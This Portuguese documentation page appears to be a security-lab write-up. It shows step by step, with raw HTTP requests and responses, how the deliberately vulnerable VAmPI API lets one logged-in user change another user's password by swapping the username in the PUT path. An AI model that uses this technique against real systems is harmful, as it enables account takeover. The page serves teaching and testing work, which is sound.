---
sidebar_position: 2
---

# Exploração
---
Tendo em mente os questionamentos levantados ao final da sessão anterior, é possível realizar os testes de segurança a fim de descobrir onde a vulnerabilidade pode ser explorada.

## Autenticação na aplicação
Para que um usuário altere sua senha, é necessário que o mesmo se autentique na aplicação, para isso basta utilizar a rota `/users/v1/login` usando uma requisição do tipo `POST` enviando as informações de login no body da requisição.

```python title="Request de login na aplicação"
POST /users/v1/login HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.2
Accept: */*
Postman-Token: 8fda313b-89ef-4bd5-a63a-fd5061565533
Host: localhost:5000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 56

{
    "username": "jordan",
    "password": "password"
}
```
Na response, um token JWT é enviado, é através dele que a autenticação será realizada em todas as requisições futuras.

```python title="Response de login na aplicação"
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 225
Server: Werkzeug/1.0.1 Python/3.8.10
Date: Sun, 02 Oct 2022 02:44:46 GMT

{
    "auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
    eyJleHAiOjE2NjQ3Mzg2ODYsImlhdCI6MTY2NDY3ODY4Niwic3ViIjoiam9yZGFuIn0.
    VrScPrN9cR0LMy7v7_YuGC0Yo3WR2KoCtoQZU4yAN3U",
    "message": "Successfully logged in.",
    "status": "success"}
```

## Alteração de senha usando a rota `/users/v1/{username}/password`
Antes de realizar a alteração de senha, será feita uma checagem no banco de dados qual é a senha utilizada pelo usuário **jordan**.

```json title="Dados do jordan antes da alteração da senha"
    {
        "admin": false,
        "email": "jjga.snf19@uea.edu.br",
        "password": "password",
        "username": "jordan"
    }
```
A senha que o **jordan** utiliza antes da alteração é *password*.

Agora com o usuário logado na aplicação, foi enviado através do PostMan a requisição do tipo `PUT` legítima na rota usada para alteração de senha, sendo interceptada pelo Burp para análise posterior.

```python title="Request legítima de alteração de senha"
PUT /users/v1/jordan/password HTTP/1.1
Content-Type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
eyJleHAiOjE2NjQ3Mzg2ODYsImlhdCI6MTY2NDY3ODY4Niwic3ViIjoiam9yZGFuIn0.
VrScPrN9cR0LMy7v7_YuGC0Yo3WR2KoCtoQZU4yAN3U
User-Agent: PostmanRuntime/7.29.2
Accept: */*
Postman-Token: 653000d0-74dc-4293-a8bc-1f6a9dad3b1f
Host: localhost:5000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 33

{
    "password": "newpassword"
}
```

A resposta recebida foi uma confirmação de que a alteração foi realizada com sucesso.

```json
HTTP/1.0 204 NO CONTENT
Content-Type: application/json
Server: Werkzeug/1.0.1 Python/3.8.10
Date: Sun, 02 Oct 2022 02:58:00 GMT
```
E, por fim, checando no banco de dados para confirmar que a alteração foi replicada para o usuário.

```json title="Dados do jordan após a alteração da senha"
   {
      "admin": false, 
      "email": "jjga.snf19@uea.edu.br", 
      "password": "newpassword", 
      "username": "jordan"
    }
```

## Vulnerabilidade na rota `/users/v1/{username}/password`
Para identificar a vulnerabilidade, as perguntas apresentadas pelo tópico anterior são o suficiente. Mas, uma delas é a mais interessante para esse momento.
- *Funções disponíveis para um grupo de usuários podem ser utilizadas por outro grupo (sendo necessário descobrir apenas o endpoint da API)?*

Tendo essa pergunta em mente, é hora de checar se um usuário poderia alterar a senha de outro usuário. Caso o token JWT não seja usado para confirmar a identidade do usuário, será possível alterar senhas de outros usuários.

No banco de dados existe um usuário chamado `name1`, que será a vítima do teste de alteração de senha.

```json title="Dados da vítima antes do ataque"
    {
      "admin": false, 
      "email": "mail1@mail.com", 
      "password": "pass1", 
      "username": "name1"
    }
```
Usando o Burp, será feita uma nova requisição utilizando o token JWT do **jordan**, porém, com o nome de usuário do **name1** com a nova senha **"hackeado!"**.

```python title="Request maliciosa usando o Burp"
PUT /users/v1/name1/password HTTP/1.1
Content-Type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
eyJleHAiOjE2NjQ3Mzg2ODYsImlhdCI6MTY2NDY3ODY4Niwic3ViIjoiam9yZGFuIn0.
VrScPrN9cR0LMy7v7_YuGC0Yo3WR2KoCtoQZU4yAN3U
User-Agent: PostmanRuntime/7.29.2
Accept: */*
Postman-Token: 653000d0-74dc-4293-a8bc-1f6a9dad3b1f
Host: localhost:5000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 31

{
    "password": "hackeado!"
}
```

A resposta do VAmPI indica que a senha foi alterada com sucesso.

```python title="Response maliciosa"
HTTP/1.0 204 NO CONTENT
Content-Type: application/json
Server: Werkzeug/1.0.1 Python/3.8.10
Date: Sun, 02 Oct 2022 03:36:27 GMT
```
Para confirmar, será feita a checagem das informações do usuário **name1** no banco de dados da aplicação.

```json title="Dados da vítima após o ataque"
    {
      "admin": false, 
      "email": "mail1@mail.com", 
      "password": "hackeado!", 
      "username": "name1"
    }
```

Isso demonstra que a aplicação está vulnerável e que, provavelmente, está utilizando apenas o nome de usuário como forma de prova de identidade.

O JWT está sendo subutilizado, sendo exclusivamente uma forma de garantir que somente usuários logados na aplicação façam a alteração da senha.

#### Mais referências disponíveis na [OWASP](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa8-injection.md).